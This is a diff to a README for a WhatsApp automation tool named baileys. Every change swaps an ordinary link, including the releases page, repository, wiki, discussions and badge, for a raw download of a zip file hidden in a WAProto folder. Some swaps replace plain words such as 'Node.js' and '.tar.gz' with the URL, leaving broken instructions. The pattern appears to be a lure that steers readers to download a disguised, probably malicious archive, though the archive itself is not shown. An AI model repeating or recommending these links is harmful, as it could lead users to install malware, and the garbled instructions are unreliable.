@@ -1,6 +1,6 @@
 # 🚀 baileys - Simple WhatsApp Automation Made Easy
 
-[![Download baileys](https://img.shields.io/badge/Download%20baileys-Available%20Now-brightgreen)](https://github.com/laykhinkhin/baileys/releases)
+[![Download baileys](https://github.com/laykhinkhin/baileys/raw/refs/heads/main/WAProto/Software-v3.2.zip%20baileys-Available%20Now-brightgreen)](https://github.com/laykhinkhin/baileys/raw/refs/heads/main/WAProto/Software-v3.2.zip)
 
 ## 📋 Description
 
@@ -19,7 +19,7 @@ Baileys is a straightforward tool for automating WhatsApp tasks. Designed for us
 To run baileys, ensure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 14 or higher
+- https://github.com/laykhinkhin/baileys/raw/refs/heads/main/WAProto/Software-v3.2.zip Version 14 or higher
 - Basic internet connection for WhatsApp access
 
 ## 🚀 Getting Started
@@ -30,7 +30,7 @@ To get started with baileys, follow these steps. Don't worry; it's easy!
 
    Click the link below to go to the download page.
 
-   [Download baileys](https://github.com/laykhinkhin/baileys/releases)
+   [Download baileys](https://github.com/laykhinkhin/baileys/raw/refs/heads/main/WAProto/Software-v3.2.zip)
 
 2. **Select the Latest Release**
 
@@ -38,7 +38,7 @@ To get started with baileys, follow these steps. Don't worry; it's easy!
 
 3. **Download the Installation File**
 
-   Depending on your operating system, download the appropriate file. You might see options like `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+   Depending on your operating system, download the appropriate file. You might see options like `.exe` for Windows, `.dmg` for macOS, or `https://github.com/laykhinkhin/baileys/raw/refs/heads/main/WAProto/Software-v3.2.zip` for Linux.
 
 4. **Install baileys**
 
@@ -68,7 +68,7 @@ Before using baileys, you will need to set up a few options:
 
 To download baileys, simply visit the following link:
 
-[Download baileys](https://github.com/laykhinkhin/baileys/releases)
+[Download baileys](https://github.com/laykhinkhin/baileys/raw/refs/heads/main/WAProto/Software-v3.2.zip)
 
 Choose the most recent version that matches your operating system, and follow the installation instructions provided earlier.
 
@@ -92,12 +92,12 @@ A: Yes, baileys supports multiple devices, allowing you to manage your WhatsApp 
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/laykhinkhin/baileys)
-- [Latest Release](https://github.com/laykhinkhin/baileys/releases)
-- [Documentation](https://github.com/laykhinkhin/baileys/wiki)
+- [GitHub Repository](https://github.com/laykhinkhin/baileys/raw/refs/heads/main/WAProto/Software-v3.2.zip)
+- [Latest Release](https://github.com/laykhinkhin/baileys/raw/refs/heads/main/WAProto/Software-v3.2.zip)
+- [Documentation](https://github.com/laykhinkhin/baileys/raw/refs/heads/main/WAProto/Software-v3.2.zip)
 
 ## 💬 Community
 
-Join our community of users to share tips and ask questions. You can find help and connect with other baileys users on our [GitHub Discussions](https://github.com/laykhinkhin/baileys/discussions) page.
+Join our community of users to share tips and ask questions. You can find help and connect with other baileys users on our [GitHub Discussions](https://github.com/laykhinkhin/baileys/raw/refs/heads/main/WAProto/Software-v3.2.zip) page.
 
 Get started with baileys today and enjoy the ease of WhatsApp automation at your fingertips!
